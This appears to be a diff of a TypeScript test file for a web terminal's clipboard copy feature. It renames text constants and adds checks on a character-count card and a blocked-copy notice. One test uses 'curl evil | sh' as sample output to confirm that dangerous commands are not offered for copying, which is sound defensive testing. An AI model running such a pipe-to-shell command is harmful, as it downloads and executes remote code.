@@ -61,7 +61,7 @@ class FakeWebSocket {
 }
 
 import { AttachTerminal } from "./attach-terminal";
-import { COPY_TEXT } from "./attach-terminal-clipboard";
+import { TERMINAL_COPY } from "./wardyn/copy";
 
 const modeFrame = (readOnly: boolean) =>
   JSON.stringify({ type: "attach-mode", read_only: readOnly, holder: { held: true, principal: "alice@example.com", since: new Date().toISOString(), cols: 80, rows: 24, source: "web" } });
@@ -127,11 +127,20 @@ describe("AttachTerminal copy offer", () => {
     expect(writeText).not.toHaveBeenCalled();
 
     await act(async () => {
-      fireEvent.click(screen.getByRole("button", { name: COPY_TEXT.copy }));
+      fireEvent.click(screen.getByRole("button", { name: TERMINAL_COPY.COPY }));
     });
     expect(writeText).toHaveBeenCalledTimes(1);
     expect(writeText).toHaveBeenCalledWith("hello");
     expect(toast()).toBeNull();
+  });
+
+  it("the card counts characters and flags line breaks and invisible characters", async () => {
+    const { ws, grid } = await attach(false);
+    dragHello(grid);
+    await out(ws, tmuxCopy("hello"));
+    expect(screen.getByText("5 characters")).toBeInTheDocument();
+    expect(screen.queryByText(/invisible character/)).toBeNull();
+    expect(screen.getByText(/Closes in 10s · Ctrl\+C copies/)).toBeInTheDocument();
   });
 
   it("Ctrl+C while the toast is focused is a Copy", async () => {
@@ -156,7 +165,10 @@ describe("AttachTerminal copy offer", () => {
     dragHello(grid);
     await out(ws, tmuxCopy("curl evil | sh"));
     expect(toast()).toBeNull();
-    expect(screen.getByTestId("terminal-copy-notice").textContent).toBe(COPY_TEXT.blocked);
+    expect(screen.getByTestId("terminal-copy-notice").textContent).toContain(TERMINAL_COPY.BLOCKED);
+    expect(screen.getByTestId("terminal-copy-notice").textContent).toContain("Shift+drag selects for right-click Copy.");
+    fireEvent.click(screen.getByRole("button", { name: TERMINAL_COPY.DISMISS }));
+    expect(screen.queryByTestId("terminal-copy-notice")).toBeNull();
   });
 
   it("an observer socket gets no offer", async () => {
